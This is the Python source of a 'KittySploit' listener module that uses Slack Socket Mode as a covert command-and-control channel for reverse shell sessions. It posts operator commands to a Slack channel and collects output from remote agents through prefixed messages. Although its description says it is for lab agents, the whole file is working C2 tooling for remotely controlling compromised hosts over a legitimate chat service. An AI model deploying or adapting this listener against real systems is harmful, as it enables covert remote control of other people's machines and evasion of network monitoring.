#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import time

from kittysploit import *

try:
    from slack_bolt import App
    from slack_bolt.adapter.socket_mode import SocketModeHandler
    SLACK_AVAILABLE = True
except Exception:
    App = SocketModeHandler = None
    SLACK_AVAILABLE = False


class Module(Listener):
    __info__ = {
        "name": "Slack Socket Mode Polling Shell",
        "description": "Uses Slack Socket Mode as a command/result transport for lab agents.",
        "author": "KittySploit Team",
        "version": "1.0.0",
        "handler": Handler.REVERSE,
        "session_type": "polling",
        "protocol": "slack_socketmode",
        "dependencies": ["slack-bolt"],
    }

    bot_token = OptString("", "Slack bot token (xoxb-...)", True)
    app_token = OptString("", "Slack app-level Socket Mode token (xapp-...)", True)
    channel_id = OptString("", "Channel ID for commands/results", True)
    client_id = OptString("slack-agent", "Client ID/session label", False)
    command_prefix = OptString("!ks", "Prefix agents use for output messages", False)

    def __init__(self, framework=None):
        super().__init__(framework)
        self.app = None
        self.handler = None
        self.running = False
        self._pending_commands = {}
        self._received_output = {}
        self._client_id_to_session = {}
        self._session_to_client_id = {}

    def _ensure_session(self, client_id):
        if client_id in self._client_id_to_session:
            return self._client_id_to_session[client_id]
        data = {
            "protocol": "slack_socketmode",
            "client_id": client_id,
            "client_ip": "slack",
            "channel_id": str(self.channel_id),
            "handler": "reverse",
            "session_type": "polling",
            "listener_type": "slack_socketmode",
        }
        sid = self._create_session("reverse", "slack", 0, data)
        if sid:
            self._client_id_to_session[client_id] = sid
            self._session_to_client_id[sid] = client_id
            self._pending_commands[sid] = []
            self._received_output[sid] = []
            print_success(f"Slack Socket Mode agent {client_id} -> session {sid}")
        return sid

    def _handle_message(self, message, say):
        text = message.get("text", "")
        channel = message.get("channel", "")
        if channel != str(self.channel_id):
            return
        prefix = str(self.command_prefix or "!ks")
        if not text.startswith(prefix):
            return
        # Format: !ks <client_id> <output>
        parts = text.split(None, 2)
        if len(parts) < 3:
            return
        client_id, output = parts[1], parts[2]
        sid = self._ensure_session(client_id)
        self._append_output(sid, output)

    def run(self, background=False):
        if not SLACK_AVAILABLE:
            print_error("slack-bolt is required for Slack Socket Mode")
            return False
        self.app = App(token=str(self.bot_token))
        self.app.message()(self._handle_message)
        sid = self._ensure_session(str(self.client_id or "slack-agent"))
        self.handler = SocketModeHandler(self.app, str(self.app_token))
        import threading
        self.running = True
        self.listener_thread = threading.Thread(target=self.handler.start, daemon=True)
        self.listener_thread.start()
        print_success(f"Slack Socket Mode listener started for channel {self.channel_id}")
        if background:
            return True
        try:
            while self.running:
                time.sleep(0.2)
        except KeyboardInterrupt:
            self.shutdown()
        return True

    def set_pending_command(self, session_id, cmd):
        client_id = self._session_to_client_id.get(session_id)
        if not client_id or not self.app:
            return
        self.app.client.chat_postMessage(channel=str(self.channel_id), text=f"{self.command_prefix}cmd {client_id} {cmd}")

    def _append_output(self, session_id, text):
        self._received_output.setdefault(session_id, []).append(text)
        self._received_output[session_id] = self._received_output[session_id][-500:]

    def get_output(self, session_id, clear=False):
        out = "\n".join(self._received_output.get(session_id, []))
        if clear:
            self._received_output[session_id] = []
        return out

    def get_output_lines(self, session_id, last_n=50):
        return self._received_output.get(session_id, [])[-last_n:]

    def shutdown(self):
        self.running = False
        if self.handler and hasattr(self.handler, "close"):
            self.handler.close()

